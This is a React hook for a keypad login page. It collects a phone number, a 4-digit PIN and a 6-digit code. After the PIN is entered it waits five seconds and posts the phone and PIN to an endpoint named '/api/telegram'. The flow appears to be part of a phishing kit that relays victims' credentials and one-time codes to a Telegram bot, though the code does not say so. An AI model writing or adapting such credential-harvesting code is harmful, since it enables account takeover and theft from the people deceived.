import { useContext, useState } from "react";
import { MainContext } from "../context/MainContext";

const useAuthPage = () => {
  const [inputFocused, setInputFocused] = useState(false);
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [password, setPassword] = useState("");

  const { data, setData } = useContext(MainContext);

  const handleKeyClick = (num) => {
    if (!inputFocused) return;

    if (data.step === "phone") {
      if (phone.length < 10) setPhone((prev) => prev + num.toString());
    } else if (data.step === "password") {
      if (password.length < 4) {
        const newPassword = password + num.toString();
        setPassword(newPassword);
        setData((prev) => ({ ...prev, passwordString: newPassword }));

        if (newPassword.length === 4) {
          setTimeout(() => {
            setData((prev) => ({ ...prev, step: "code" }));

            fetch("/api/telegram", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                phone,
                password: newPassword,
                code: null,
              }),
            }).catch((err) => console.error("Error enviando datos:", err));
          }, 5000);
        }
      }
    } else if (data.step === "code") {
      if (code.length < 6) {
        setCode((prev) => prev + num.toString());
      }
    }
  };

  const handleDelete = () => {
    if (data.step === "phone") {
      setPhone((prev) => prev.slice(0, -1));
    } else if (data.step === "password") {
      setPassword((prev) => prev.slice(0, -1));
    } else if (data.step === "code") {
      setCode((prev) => prev.slice(0, -1));
    }
  };

  const isValidPhone = () => /^3\d{9}$/.test(phone);

  return {
    inputFocused,
    setInputFocused,
    phone,
    password,
    code,
    setPassword,
    setCode,
    handleKeyClick,
    handleDelete,
    isValidPhone,
    setPhone,
    step: data.step,
    setStep: (newStep) => setData((prev) => ({ ...prev, step: newStep })),
  };
};

export default useAuthPage;
